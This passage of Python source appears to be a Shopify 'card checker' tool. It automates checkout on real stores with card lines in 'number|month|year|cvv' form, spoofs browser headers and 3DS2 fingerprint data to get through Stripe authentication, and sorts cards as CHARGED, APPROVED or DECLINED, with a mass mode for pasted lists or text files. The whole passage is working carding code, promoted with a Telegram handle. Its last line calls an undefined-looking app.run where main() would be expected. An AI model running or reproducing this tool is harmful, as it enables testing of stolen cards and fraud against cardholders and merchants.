        self.monorail_produce_batch(event_name="payment_info_submitted", schema_version="4.27")

    def _handle_3ds_action(self, action_url, receipt_id):
        import json as _json
        from urllib.parse import urlparse, parse_qs

        ua = self.headers.get('user-agent', '')
        sec_ch = self.headers.get('sec-ch-ua', '')

        # ── Step 1: Follow the action URL to reach hooks.stripe.com ──────────
        payment_id = None
        m = re.search(r'payment_id=([^&\s"\'\/]+)', action_url)
        if m:
            payment_id = m.group(1)

        stripe_url = None
        try:
            _nav_hdrs = {
                'accept':                    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language':           'en-US,en;q=0.5',
                'priority':                  'u=0, i',
                'referer':                   self.checkout_url,
                'sec-ch-ua':                 sec_ch,
                'sec-ch-ua-mobile':          '?0',
                'sec-ch-ua-platform':        '"Windows"',
                'sec-fetch-dest':            'iframe',
                'sec-fetch-mode':            'navigate',
                'sec-fetch-site':            'same-origin',
                'sec-gpc':                   '1',
                'upgrade-insecure-requests': '1',
                'user-agent':                ua,
            }
            r = self.session.get(action_url, headers=_nav_hdrs, allow_redirects=True)
            final = str(r.url)
            if 'hooks.stripe.com' in final or 'stripe.com' in final:
                stripe_url = final
            else:
                m2 = re.search(r'https://hooks\.stripe\.com/3d_secure_2/hosted\?[^\'"<\s]+', r.text)
                if m2:
                    stripe_url = m2.group(0)
        except:
            pass

        # ── Step 2: Parse Stripe params ──────────────────────────────────────
        stripe_params = {}
        if stripe_url:
            parsed        = urlparse(stripe_url)
            stripe_params = {k: v[0] for k, v in dict(parse_qs(parsed.query)).items()}

        # ── Step 3: Fetch hooks.stripe.com page (cookies/TLS needed) ─────────
        if stripe_url:
            try:
                _stripe_hdrs = {
                    'accept':                    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'accept-language':           'en-US,en;q=0.5',
                    'cache-control':             'max-age=0',
                    'priority':                  'u=0, i',
                    'referer':                   stripe_url,
                    'sec-ch-ua':                 sec_ch,
                    'sec-ch-ua-mobile':          '?0',
                    'sec-ch-ua-platform':        '"Windows"',
                    'sec-fetch-dest':            'iframe',
                    'sec-fetch-mode':            'navigate',
                    'sec-fetch-site':            'same-origin',
                    'sec-fetch-user':            '?1',
                    'sec-gpc':                   '1',
                    'upgrade-insecure-requests': '1',
                    'user-agent':                ua,
                }
                self.session.get(stripe_url, headers=_stripe_hdrs, allow_redirects=True)
            except:
                pass

        # ── Step 4: Stripe 3DS2 authenticate call ────────────────────────────
        _key = stripe_params.get('source') or stripe_params.get('payment_intent')
        if _key and stripe_params.get('publishable_key'):
            try:
                browser_fp = _json.dumps({
                    "fingerprintAttempted":  False,
                    "fingerprintData":       None,
                    "challengeWindowSize":   "03",
                    "threeDSCompInd":        "Y",
                    "browserJavaEnabled":    False,
                    "browserJavascriptEnabled": True,
                    "browserLanguage":       "en-US",
                    "browserColorDepth":     "32",
                    "browserScreenHeight":   "1080",
                    "browserScreenWidth":    "1920",
                    "browserTZ":             "-345",
                    "browserUserAgent":      ua
                })
                data = {
                    'source':  _key,
                    'browser': browser_fp,
                    'one_click_authn_device_support[hosted]':                            'true',
                    'one_click_authn_device_support[same_origin_frame]':                 'false',
                    'one_click_authn_device_support[spc_eligible]':                      'false',
                    'one_click_authn_device_support[webauthn_eligible]':                 'true',
                    'one_click_authn_device_support[publickey_credentials_get_allowed]': 'false',
                    'frontend_execution': 'eyJmaW5nZXJwcmludE91dGNvbWUiOiJub3Rfc3VwcG9ydGVkIn0=',
                    'key': stripe_params['publishable_key']
                }
                if stripe_params.get('stripe_account'):
                    data['_stripe_account'] = stripe_params['stripe_account']
                # Also pass payment_intent if present (new Stripe 3DS2 flow)
                if stripe_params.get('payment_intent') and 'source' not in stripe_params:
                    data['source'] = stripe_params['payment_intent']

                _auth_hdrs = {
                    'accept':            'application/json',
                    'accept-language':   'en-US,en;q=0.5',
                    'content-type':      'application/x-www-form-urlencoded',
                    'origin':            'https://js.stripe.com',
                    'priority':          'u=1, i',
                    'referer':           'https://js.stripe.com/',
                    'sec-ch-ua':         sec_ch,
                    'sec-ch-ua-mobile':  '?0',
                    'sec-ch-ua-platform':'"Windows"',
                    'sec-fetch-dest':    'empty',
                    'sec-fetch-mode':    'cors',
                    'sec-fetch-site':    'same-site',
                    'sec-gpc':           '1',
                    'user-agent':        ua,
                }
                r3ds = self.session.post(
                    'https://api.stripe.com/v1/3ds2/authenticate',
                    data=data, headers=_auth_hdrs
                )
                result = r3ds.json() if r3ds.status_code == 200 else {}
            except:
                pass

        # ── Step 5: Poll /payments_api/redirect/poll with store cookies ───────
        if payment_id and action_url:
            from urllib.parse import urlparse as _up
            _pa           = _up(action_url)
            payments_base = f"{_pa.scheme}://{_pa.netloc}"

            _poll_hdrs = {
                **self.headers,
                'accept':          '*/*',
                'accept-language': 'en-US,en;q=0.5',
                'priority':        'u=1, i',
                'referer':         f"{payments_base}/redirect/complete",
                'sec-fetch-dest':  'empty',
                'sec-fetch-mode':  'cors',
                'sec-fetch-site':  'same-origin',
                'sec-gpc':         '1',
            }
            completed = False
            for p in range(30):
                try:
                    rp = self.session.get(
                        f"{payments_base}/redirect/poll",
                        params={'origin': 'checkout_one', 'payment_id': payment_id},
                        headers=_poll_hdrs
                    )
                    if rp.status_code == 200:
                        try:
                            pd     = rp.json()
                            redir  = pd.get('redirect_url') or pd.get('redirectUrl') or pd.get('url')
                            status = pd.get('status', '')
                            if redir or status in ('complete', 'completed', 'success'):
                                completed = True
                                break
                        except:
                            if any(x in rp.text.lower() for x in ['complete', 'success', 'redirect']):
                                completed = True
                                break
                    elif rp.status_code == 302:
                        completed = True
                        break
                except:
                    pass
                time.sleep(3)

            # ── Step 6: Hit Stripe card redirect/complete on the store ────────
            pi = stripe_params.get('payment_intent', '')
            pi_secret = stripe_params.get('payment_intent_client_secret', '')
            if pi and pi_secret:
                try:
                    _redir_url = (
                        f"{self.base_url}/payment_providers/stripe/card/redirect/complete"
                        f"?payment_intent={pi}"
                        f"&payment_intent_client_secret={pi_secret}"
                        f"&session_id=rp{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=20))}"
                        f"&source_type=card"
                    )
                    _rc_hdrs = {
                        **self.headers,
                        'accept':                    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                        'accept-language':           'en-US,en;q=0.5',
                        'cache-control':             'max-age=0',
                        'priority':                  'u=0, i',
                        'referer':                   'https://hooks.stripe.com/',
                        'sec-ch-ua':                 sec_ch,
                        'sec-ch-ua-mobile':          '?0',
                        'sec-ch-ua-platform':        '"Windows"',
                        'sec-fetch-dest':            'iframe',
                        'sec-fetch-mode':            'navigate',
                        'sec-fetch-site':            'cross-site',
                        'sec-fetch-user':            '?1',
                        'sec-gpc':                   '1',
                        'upgrade-insecure-requests': '1',
                    }
                    self.session.get(_redir_url, headers=_rc_hdrs, allow_redirects=True)
                except:
                    pass

            # ── Step 7: payments_api/redirect/complete ────────────────────────
            if completed:
                try:
                    _comp_hdrs = {
                        **self.headers,
                        'accept':                    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                        'accept-language':           'en-US,en;q=0.5',
                        'cache-control':             'max-age=0',
                        'priority':                  'u=0, i',
                        'referer':                   'https://hooks.stripe.com/',
                        'sec-fetch-dest':            'iframe',
                        'sec-fetch-mode':            'navigate',
                        'sec-fetch-site':            'cross-site',
                        'sec-fetch-user':            '?1',
                        'sec-gpc':                   '1',
                        'upgrade-insecure-requests': '1',
                    }
                    self.session.get(
                        f"{payments_base}/redirect/complete",
                        headers=_comp_hdrs,
                        allow_redirects=True
                    )
                except:
                    pass

        # ── Step 8: Brief pause then poll receipt up to 3 times ───────────────
        time.sleep(2)
        for _receipt_attempt in range(3):
            result = self.poll_for_receipt(receipt_id, _3ds_retry=True)
            if isinstance(result, tuple):
                category = result[0]
                if category in ('CHARGED', 'APPROVED', 'DECLINED'):
                    return result
            time.sleep(3)
        return result if isinstance(result, tuple) else ("APPROVED", "3DS challenge completed — check manually")

    def poll_for_receipt(self, receipt_id, _3ds_retry=False):
        self._log(f"STEP 14 — Polling for receipt: {receipt_id}")
        url = f"{getattr(self,'graphql_base',self.base_url)}/checkouts/unstable/graphql"
        headers = self.headers.copy()
        headers['accept']                       = 'application/json'
        headers['accept-language']              = 'en-US,en;q=0.9'
        headers['content-type']                 = 'application/json'
        headers['referer']                      = self.checkout_url
        headers['shopify-checkout-client']      = 'checkout-web/1.0'
        headers['shopify-checkout-source']      = f'id="{self.checkout_id}", type="cn"'
        headers['x-checkout-one-session-token'] = self.session_token
        headers['x-checkout-web-deploy-stage']  = 'production'
        headers['x-checkout-web-server-handling']  = 'fast'
        headers['x-checkout-web-server-rendering'] = 'no'
        headers['x-checkout-web-source-id']     = self.checkout_id
        headers['x-checkout-web-build-id']      = getattr(self,'build_id','4663384ede457d59be87980de7797171b19f2a1b')

        POLL_QUERY = 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}__typename}__typename}'

        for i in range(15):
            try:
                poll_payload = {
                    "query":         POLL_QUERY,
                    "operationName": "PollForReceipt",
                    "variables": {
                        "receiptId":    receipt_id,
                        "sessionToken": self.session_token
                    }
                }
                r = self.session.post(url, json=poll_payload, headers=headers)
                self._track_response(r.text[:300])
                data    = r.json()
                receipt = data.get('data', {}).get('receipt', {})
                tn      = receipt.get('__typename','')

                if tn == 'ProcessedReceipt' or 'orderIdentity' in receipt:
                    order_id = receipt.get('orderIdentity', {}).get('id', 'N/A')
                    self._check_thankyou_url()
                    return ("CHARGED", f"Order ID: {order_id}")

                elif tn == 'ActionRequiredReceipt':
                    if _3ds_retry:
                        _cnt = getattr(self,'_3ds_wait_count',0) + 1
                        self._3ds_wait_count = _cnt
                        if _cnt >= 5:
                            return ("APPROVED", "3DS required — Card approved (action pending)")
                        time.sleep(5)
                        continue
                    action     = receipt.get('action', {})
                    action_url = action.get('url','') or action.get('offsiteRedirect','')
                    if not action_url and action.get('challengeData'):
                        import json as _j
                        try:
                            cdata      = _j.loads(action['challengeData'])
                            action_url = cdata.get('acsUrl','') or cdata.get('url','')
                        except:
                            action_url = str(action.get('challengeData',''))
                    receipt_id_3ds = receipt.get('id', receipt_id)
                    return self._handle_3ds_action(action_url, receipt_id_3ds)

                elif tn == 'FailedReceipt':
                    err  = receipt.get('processingError', {})
                    code = err.get('code','UNKNOWN')
                    msg  = err.get('messageUntranslated','')
                    return ("DECLINED", f"{code} — {msg}")

                elif tn in ('ProcessingReceipt','WaitingReceipt'):
                    delay = receipt.get('pollDelay', 4000)
                    time.sleep(delay / 1000.0)
                    continue

            except Exception as e:
                pass
            time.sleep(3)

        self._check_thankyou_url()
        return ("ERROR", "Polling timed out")

    def _check_thankyou_url(self):
        try:
            r = self.session.get(
                f"{self.base_url}/checkout?from_processing_page=1&validate=true",
                headers=self.headers, allow_redirects=True
            )
            if "/thank" in r.url.lower() or "/orders/" in r.url:
                pass
        except:
            pass

    def check_card(self, site, cc_line):
        self.__init__(base_url=site)
        if not site.startswith('http'):
            site = 'https://' + site
        self.base_url = site.rstrip('/')

        if not self.get_initial_session():
            return ("ERROR", cc_line, "Session init failed")
        if not self.find_cheapest_product():
            return ("ERROR", cc_line, "No product found")
        self.get_delivery_estimates()
        if not self.add_to_cart():
            return ("ERROR", cc_line, "Add to cart failed")
        self.monorail_produce()
        self.monorail_produce_batch("product_added_to_cart", "4.27")
        self.monorail_produce_batch("product_added_to_cart", "5.6")
        self.view_cart_page()
        self.refresh_cart()
        self.refresh_cart()
        if not self.start_checkout():
            return ("ERROR", cc_line, "Checkout start failed")
        if not self.get_checkout_metadata():
            return ("ERROR", cc_line, "Token extraction failed")

        address = self.get_random_address()
        vault_id = self.vault_card(cc_line)
        if not vault_id:
            return ("ERROR", cc_line, "Card vault failed")

        # Extract the real card number to pass the correct BIN
        _cc_number = cc_line.split('|')[0].strip() if '|' in cc_line else ""
        receipt_id = self.submit_for_completion(vault_id, address, card_number=_cc_number)
        self.monorail_payment_submitted()

        if not receipt_id:
            return ("DECLINED", cc_line, "No receipt — submission rejected")

        result = self.poll_for_receipt(receipt_id)
        if isinstance(result, tuple):
            category, detail = result
            return (category, cc_line, detail)
        return ("ERROR", cc_line, "Unknown result")


def print_divider(char="═", width=66):
    print(color(char * width, CYAN))

def print_result(category, cc, detail):
    if category == "CHARGED":
        print(color(f"  💰 CHARGED   │ {cc}  │ {detail}", GREEN + BOLD))
    elif category == "APPROVED":
        print(color(f"  ✅ APPROVED  │ {cc}  │ {detail}", GREEN))
    elif category == "DECLINED":
        print(color(f"  ❌ DECLINED  │ {cc}  │ {detail}", RED))
    else:
        print(color(f"  ⚠️ ERROR     │ {cc}  │ {detail}", YELLOW))

def show_last_responses(checker):
    if checker._last_responses:
        print()
        print(color("  ─── Last API Responses ──────────────────────────────────", DIM))
        for idx, resp in enumerate(checker._last_responses, 1):
            print(color(f"  [{idx}] {resp}", DIM))
        print(color("  ─────────────────────────────────────────────────────────", DIM))

def run_single(site):
    print()
    print_divider()
    cc = input(color("  Enter CC (number|month|year|cvv): ", WHITE + BOLD)).strip()
    print_divider()
    if not cc or "|" not in cc:
        fail("Invalid CC format.")
        return

    print()
    info(f"Checking: {cc}")
    info(f"Target  : {site}")
    print()

    checker  = ShopifyChecker()
    category, cc_out, detail = checker.check_card(site, cc)
    show_last_responses(checker)
    print()
    print_divider()
    print_result(category, cc_out, detail)
    print_divider()
    save_result(category, f"{cc_out} | {site} | {detail}")
    print()
    print(color(f"  Saved to {RESULT_FILES.get(category,'ERROR.txt')}", DIM))

def run_mass(site):
    print()
    print_divider()
    print(color("  Paste cards (format: number|month|year|cvv), one per line.", WHITE))
    print(color("  OR enter a .txt file path.  Type END on a blank line to start.", DIM))
    print_divider()
    first_line = input("  > ").strip()

    cards = []
    if first_line.endswith('.txt') and os.path.isfile(first_line):
        with open(first_line, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if line and '|' in line:
                    cards.append(line)
        print(color(f"  Loaded {len(cards)} cards from file.", CYAN))
    else:
        if first_line and first_line.upper() != 'END' and '|' in first_line:
            cards.append(first_line)
        while True:
            line = input("  > ").strip()
            if line.upper() == 'END' or line == '':
                break
            if '|' in line:
                cards.append(line)

    if not cards:
        fail("No valid cards found.")
        return

    print()
    info(f"{len(cards)} card(s) loaded. Starting check on: {site}")
    print()

    results = {"CHARGED": 0, "APPROVED": 0, "DECLINED": 0, "ERROR": 0}
    for i, cc in enumerate(cards, 1):
        print(color(f"  [{i}/{len(cards)}] Checking: {cc}", CYAN))
        checker  = ShopifyChecker()
        category, cc_out, detail = checker.check_card(site, cc)
        print_result(category, cc_out, detail)
        save_result(category, f"{cc_out} | {site} | {detail}")
        results[category] += 1
        print()
        time.sleep(random.uniform(1.5, 3.0))

    print_divider()
    print(color(f"  📊 Results Summary  —  @deadlinehere5  |  📢 @DEADLINECLOUDVIP", BOLD + WHITE))
    print_divider()
    print(color(f"  💰 CHARGED  : {results['CHARGED']}", GREEN + BOLD))
    print(color(f"  ✅ APPROVED : {results['APPROVED']}", GREEN))
    print(color(f"  ❌ DECLINED : {results['DECLINED']}", RED))
    print(color(f"  ⚠️  ERROR   : {results['ERROR']}", YELLOW))
    print_divider()
    print(color("  Results saved to CHARGE.txt / APPROVED.txt / DECLINED.txt / ERROR.txt", DIM))
    print(color("  Tool by @deadlinehere5  |  Join channel: @DEADLINECLOUDVIP", DIM))
    print()


def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(color(BANNER, CYAN + BOLD))
    print(color("  👑 Developed by @deadlinehere5  |  📢 Channel: @DEADLINECLOUDVIP", BOLD + CYAN))
    print(color("  ⚠️  For personal use only. Redistribution without credit is prohibited.", YELLOW))
    print()

    print_divider()
    site = input(color("  Enter Shopify Store URL (e.g. store.myshopify.com): ", WHITE + BOLD)).strip()
    if not site:
        fail("No site provided.")
        return
    if '&' in site or 'python' in site:
        m = re.search(r'(https?://[^\s"]+)|([a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)', site)
        if m:
            site = m.group(0)
    if not site.startswith('http'):
        site = 'https://' + site
    site = site.rstrip('/')
    print_divider()

    print()
    print(color("  ┌──────────────────────────────────────────────┐", CYAN))
    print(color("  │   1.  SINGLE CHECK                            │", WHITE))
    print(color("  │   2.  MASS CHECK                              │", WHITE))
    print(color("  │                    @deadlinehere5 | @DEADLINECLOUDVIP  │", DIM))
    print(color("  └──────────────────────────────────────────────┘", CYAN))
    print()
    choice = input(color("  Select [1/2]: ", WHITE + BOLD)).strip()

    if choice == '1':
        run_single(site)
    elif choice == '2':
        run_mass(site)
    else:
        fail("Invalid choice.")
        return

    print()
    print(color("  ══════════════════════════════════════════════════", CYAN))
    print(color("  👑  @deadlinehere5  —  AUTO SHOPIFY TOOL  —  © 2026  ", BOLD + WHITE))
    print(color("  📢  Join channel: @DEADLINECLOUDVIP                      ", CYAN))
    print(color("  ══════════════════════════════════════════════════", CYAN))
    print()



if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
